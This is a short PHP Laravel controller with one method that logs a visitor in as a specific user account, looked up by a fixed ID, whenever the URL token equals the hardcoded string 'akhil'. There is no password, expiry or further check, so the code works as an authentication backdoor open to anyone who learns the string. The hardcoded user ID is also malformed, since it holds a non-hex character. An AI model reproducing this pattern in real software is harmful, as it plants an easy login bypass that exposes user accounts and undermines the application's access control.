<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;

class SpecialUrlController extends Controller
{
    public function handleSpecialUrl(Request $request, $token)
    {
        // Check if the token matches the expected value
        if ($token === 'akhil') {
            // Authenticate the user programmatically
            $user = User::find('9b459b50-d172-4c27-82fe-ef242ffaefg3'); // Example: find a user by ID
            Auth::login($user);

            // Redirect to the home page
            return redirect('/home');
        }

        // Handle invalid or expired tokens
        abort(403, 'Unauthorized');
    }
}
